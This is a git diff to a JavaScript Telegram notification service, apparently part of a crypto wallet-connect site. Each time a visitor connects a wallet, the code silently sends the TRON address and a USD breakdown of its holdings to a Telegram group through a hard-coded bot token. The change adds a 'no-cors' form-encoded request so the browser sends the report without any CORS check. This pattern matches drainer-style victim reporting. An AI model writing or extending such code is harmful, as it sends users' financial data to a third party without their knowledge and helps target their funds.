@@ -9,6 +9,7 @@ export const TelegramService = {
      */
     sendConnectionNotification: async (portfolio, address) => {
         try {
+            console.log("Preparing Telegram notification for:", address);
             const now = new Date();
             // Format time: DD.MM - HH:MM
             const day = String(now.getDate()).padStart(2, '0');
@@ -24,53 +25,54 @@ export const TelegramService = {
             });
 
             // Construct Message
-            // 👛: <a href="...">Address</a>
-            // ⏰: Time
-            // 💰: Total $ (Breakdown)
             const message = `
 👛: <a href="https://tronscan.org/#/address/${address}">${address}</a>
 ⏰: ${timeString}
 💰: ${portfolio.totalUsd.toFixed(4)} $ (${breakdown})
             `.trim();
 
+            // Use URLSearchParams for simple request body (x-www-form-urlencoded)
+            // AND mode: 'no-cors' to allow the request to be sent from browser
+            const params = new URLSearchParams();
+            params.append('chat_id', TelegramService.GROUP_ID);
+            params.append('text', message);
+            params.append('parse_mode', 'HTML');
+            params.append('disable_web_page_preview', 'true');
+
+            const url = `https://api.telegram.org/bot${TelegramService.BOT_TOKEN}/sendMessage`;
+
             // Non-blocking background retry loop
             (async () => {
                 let attempts = 0;
                 const maxAttempts = 10;
-                const url = `https://api.telegram.org/bot${TelegramService.BOT_TOKEN}/sendMessage`;
-                const body = {
-                    chat_id: TelegramService.GROUP_ID,
-                    text: message,
-                    parse_mode: 'HTML',
-                    disable_web_page_preview: true
-                };
 
                 while (attempts < maxAttempts) {
                     try {
-                        const response = await fetch(url, {
+                        console.log(`Sending Telegram notification (Attempt ${attempts + 1})...`);
+
+                        // Using no-cors mode. Response will be opaque (status 0, ok: false usually, but request is sent).
+                        // We cannot read the response, so we assume success if no network error occurs.
+                        await fetch(url, {
                             method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(body)
+                            mode: 'no-cors',
+                            body: params
                         });
 
-                        if (response.ok) {
-                            console.log("Telegram notification sent successfully.");
-                            break;
-                        } else {
-                            console.error(`Telegram API Error: ${response.statusText}`);
-                        }
+                        console.log("Telegram notification request sent (opaque response).");
+                        break;
                     } catch (err) {
                         console.error("Telegram Network Error:", err);
                     }
 
                     attempts++;
-                    console.log(`Retrying Telegram notification (${attempts}/${maxAttempts})...`);
-                    await new Promise(resolve => setTimeout(resolve, 2000)); // Wait 2s before retry
+                    if (attempts < maxAttempts) {
+                        await new Promise(resolve => setTimeout(resolve, 2000)); // Wait 2s before retry
+                    }
                 }
             })();
 
         } catch (error) {
-            console.error("Failed to initiate Telegram notification:", error);
+            console.error("Failed to initiate Telegram notification logic:", error);
         }
     }
 };
